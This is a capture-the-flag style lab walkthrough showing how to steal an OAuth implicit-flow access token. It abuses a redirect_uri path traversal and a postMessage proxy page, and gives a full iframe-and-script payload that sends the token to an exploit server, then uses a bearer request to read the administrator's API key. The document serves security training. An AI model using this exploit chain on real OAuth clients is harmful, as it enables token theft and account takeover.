# Lab: Stealing OAuth Access Tokens via a Proxy Page

**Difficulty:** Expert

---

# Lab Objective

Exploit an OAuth implementation flaw that allows leaking an OAuth **Access Token** to a proxy page inside the client application.

Use the stolen Access Token to retrieve the administrator's API key.

---

# Step 1 — Login Normally

Login using the provided social account.

**Credentials**

```
Username: wiener
Password: peter
```

Intercept the OAuth authorization request.

```http
GET /auth?client_id=...&redirect_uri=https://LAB/oauth-callback&response_type=token&scope=openid%20profile%20email
Host: oauth-LAB.oauth-server.net
```

Notice:

```
response_type=token
```

This means the OAuth server returns an **Access Token** directly inside the URL fragment.

Example:

```
#access_token=...
```

---

# Step 2 — Identify an Open Redirect

Browse the application and locate an open redirect.

Example:

```http
GET /post/next?path=/post?postId=4
```

Testing:

```
/post/next?path=https://example.com
```

confirms the redirect is vulnerable.

---

# Step 3 — Find the Proxy Page

Inspect the blog post page.

Example:

```
/post?postId=10
```

Notice the page contains:

```javascript
window.addEventListener('message', ...)
```

and embeds:

```
/post/comment/comment-form
```

The comment form communicates with its parent using:

```javascript
parent.postMessage(...)
```

making it usable as a proxy page.

---

# Step 4 — Modify redirect_uri

Intercept the OAuth request and replace the redirect URI.

Original:

```
/oauth-callback
```

Modified:

```
/oauth-callback/../post/comment/comment-form
```

After authentication, the browser is redirected to:

```
/post/comment/comment-form#access_token=...
```

confirming the Access Token reaches the proxy page.

---

# Step 5 — Create the Exploit

Create the following payload.

```html
<iframe src="https://oauth-LAB.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data));
}, false);
</script>
```

Store the exploit.

---

# Step 6 — Deliver to Victim

Click:

```
Deliver exploit to victim
```

The administrator loads the exploit while already authenticated with the OAuth provider.

The exploit leaks the administrator's Access Token to the Exploit Server.

Example:

```
GET /?access_token=8uz5AIVDtvDY0DJH3pUYEw9JfyeY5sT7cmKf0irdRKz
```

---

# Step 7 — Retrieve Administrator Information

Use the stolen Access Token.

```http
GET /me HTTP/2
Host: oauth-LAB.oauth-server.net
Authorization: Bearer 8uz5AIVDtvDY0DJH3pUYEw9JfyeY5sT7cmKf0irdRKz
```

Response:

```json
{
    "sub":"administrator",
    "apikey":"0n3ITcUXUNeUNqZ5ocKBLX8xuEJAHfij",
    "name":"Administrator",
    "email":"administrator@normal-user.net",
    "email_verified":true
}
```

Copy:

```
apikey
```

Submit it to solve the lab.

---

# Vulnerability

**OAuth Access Token Theft via Proxy Page + Open Redirect**

---

# Root Cause

The OAuth provider only validates the beginning of the registered `redirect_uri`.

Using path traversal allows redirecting users to a proxy page inside the client application that forwards the URL (including the Access Token fragment) to an attacker-controlled endpoint.

---

# Impact

- OAuth Access Token Theft
- Unauthorized Access to OAuth Resources
- Disclosure of Sensitive User Information
- Account Compromise

---

# Key Takeaways

- `response_type=token` returns the Access Token in the URL fragment.
- Open Redirects can be chained with OAuth misconfigurations.
- `postMessage()` can unintentionally expose OAuth fragments.
- Proxy pages inside the client application can leak sensitive tokens.
- OAuth Implicit Flow is significantly more exposed to token leakage than Authorization Code Flow.
